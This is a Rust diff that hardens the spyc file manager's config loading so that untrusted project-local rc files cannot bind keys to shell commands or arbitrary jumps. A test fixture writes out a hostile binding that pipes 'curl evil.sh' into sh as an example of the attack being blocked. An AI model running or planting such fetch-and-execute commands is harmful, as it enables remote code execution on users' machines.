@@ -314,34 +314,66 @@ struct ScanPatternFile {
     url: Option<String>,
 }
 
+/// Trust level of a config file. A `Project` (`<cwd>/.spycrc.toml`) file is
+/// attacker-controllable, so its executing keymap bindings are dropped;
+/// `Trusted` (`$HOME/.spycrc.toml`, or explicit caller-supplied paths) is
+/// honored in full.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Trust {
+    Trusted,
+    Project,
+}
+
 impl Config {
     /// Load and merge the standard config file locations. Missing files
     /// are silently skipped; broken TOML / DSL returns an `Err`.
+    ///
+    /// The user file (`$HOME/.spycrc.toml`) is **trusted**; the project file
+    /// (`<cwd>/.spycrc.toml`) is **not** — spyc is routinely pointed at
+    /// hostile content (cloned repos, extracted tarballs), so a project rc
+    /// must not be able to bind a key to a shell command (`unix`) or an
+    /// arbitrary `jump`. Those executing bindings are dropped from the
+    /// project file; cosmetic/behavioral settings ([colors], [layout], …)
+    /// and plain rebindings are still honored.
     pub fn load_default(cwd: &Path) -> anyhow::Result<Self> {
         let user = home_dir().map(|h| h.join(".spycrc.toml"));
         let project = cwd.join(".spycrc.toml");
-        Self::load_from(&[user.as_deref(), Some(&project)])
+        let mut cfg = Self::default();
+        if let Some(u) = user.as_deref() {
+            cfg.load_one(u, Trust::Trusted)?;
+        }
+        cfg.load_one(&project, Trust::Project)?;
+        Ok(cfg)
     }
 
-    /// Load from an explicit list of candidate paths. Later paths override
-    /// earlier ones for settings; keymap bindings and ignore masks are
-    /// **appended** in order so both user and project can contribute.
+    /// Load from an explicit list of candidate paths, all **trusted**. Later
+    /// paths override earlier ones for settings; keymap bindings and ignore
+    /// masks are **appended** in order so both files can contribute. Test-only
+    /// since production loads via `load_default` (which assigns per-file
+    /// trust); kept as the harness for the merge/precedence test matrix.
+    #[cfg(test)]
     pub fn load_from(paths: &[Option<&Path>]) -> anyhow::Result<Self> {
         let mut cfg = Self::default();
         for path in paths.iter().flatten() {
-            if !path.is_file() {
-                continue;
-            }
-            let text = std::fs::read_to_string(path)
-                .map_err(|e| anyhow::anyhow!("reading {}: {e}", path.display()))?;
-            let file: FileConfig = toml::from_str(&text)
-                .map_err(|e| anyhow::anyhow!("parsing {}: {e}", path.display()))?;
-            cfg.merge_file(file, path)?;
+            cfg.load_one(path, Trust::Trusted)?;
         }
         Ok(cfg)
     }
 
-    fn merge_file(&mut self, file: FileConfig, source: &Path) -> anyhow::Result<()> {
+    /// Read + parse + merge one config file at the given trust level.
+    /// Missing files are a no-op.
+    fn load_one(&mut self, path: &Path, trust: Trust) -> anyhow::Result<()> {
+        if !path.is_file() {
+            return Ok(());
+        }
+        let text = std::fs::read_to_string(path)
+            .map_err(|e| anyhow::anyhow!("reading {}: {e}", path.display()))?;
+        let file: FileConfig = toml::from_str(&text)
+            .map_err(|e| anyhow::anyhow!("parsing {}: {e}", path.display()))?;
+        self.merge_file(file, path, trust)
+    }
+
+    fn merge_file(&mut self, file: FileConfig, source: &Path, trust: Trust) -> anyhow::Result<()> {
         self.sources.push(source.to_path_buf());
 
         // Settings: later wins. (Currently just bools — no-op placeholders
@@ -442,6 +474,16 @@ impl Config {
             let parsed = dsl::parse(line)
                 .map_err(|e| anyhow::anyhow!("{}: keymap[{i}]: {e}", source.display()))?;
             if let Some(binding) = parsed {
+                // An untrusted (project-local) rc may not introduce a binding
+                // that runs a shell command or jumps to an arbitrary path on a
+                // keypress — that's the `.spycrc` keypress-RCE vector. Drop it
+                // silently and keep loading the rest (erroring here would
+                // discard the trusted $HOME config too). Such bindings must
+                // live in $HOME/.spycrc.toml. Plain prompt-openers
+                // (copy/move/remove) carry no payload and are left alone.
+                if trust == Trust::Project && binding.action.is_executing() {
+                    continue;
+                }
                 self.bindings.push(binding);
             }
         }
@@ -632,6 +674,69 @@ exec = "#112233"
         assert_eq!(cfg.colors.dir.as_deref(), Some("#aabbcc"));
         assert_eq!(cfg.colors.exec.as_deref(), Some("#112233"));
         assert_eq!(cfg.bindings.len(), 2);
+    }
+
+    /// A project-local (untrusted) rc may set cosmetic options and rebind to
+    /// built-in actions, but its `unix`/`jump` bindings — the keypress-RCE /
+    /// arbitrary-navigation vector — are dropped.
+    #[test]
+    fn project_config_drops_executing_bindings_keeps_cosmetic() {
+        let tmp = tempdir().unwrap();
+        let path = tmp.path().join(".spycrc.toml");
+        let mut f = std::fs::File::create(&path).unwrap();
+        writeln!(
+            f,
+            r##"
+keymap = [
+    "map j unix curl evil.sh | sh",
+    "map g jump =/etc",
+    "map K down",
+]
+
+[colors]
+dir = "#aabbcc"
+"##
+        )
+        .unwrap();
+
+        let mut cfg = Config::default();
+        cfg.load_one(&path, Trust::Project).unwrap();
+        // Cosmetic settings from a project rc are honored.
+        assert_eq!(cfg.colors.dir.as_deref(), Some("#aabbcc"));
+        // The plain rebinding (`down`) survives; the executing `unix`/`jump`
+        // bindings are dropped.
+        assert_eq!(cfg.bindings.len(), 1, "only the plain rebinding survives");
+        assert!(
+            !cfg.bindings.iter().any(|b| b.action.is_executing()),
+            "no executing binding may come from a project rc"
+        );
+    }
+
+    #[test]
+    fn trusted_config_keeps_executing_bindings() {
+        use crate::keymap::user::BoundAction;
+        let tmp = tempdir().unwrap();
+        let path = tmp.path().join(".spycrc.toml");
+        let mut f = std::fs::File::create(&path).unwrap();
+        writeln!(
+            f,
+            r#"
+keymap = [
+    "map j unix make %",
+    "map g jump =/usr/local",
+]
+"#
+        )
+        .unwrap();
+
+        let mut cfg = Config::default();
+        cfg.load_one(&path, Trust::Trusted).unwrap();
+        assert_eq!(cfg.bindings.len(), 2, "$HOME rc keeps executing bindings");
+        assert!(
+            cfg.bindings
+                .iter()
+                .any(|b| matches!(b.action, BoundAction::UnixCmd(_)))
+        );
     }
 
     // ── DSL → Resolver → Action round-trip tests ──────────────────
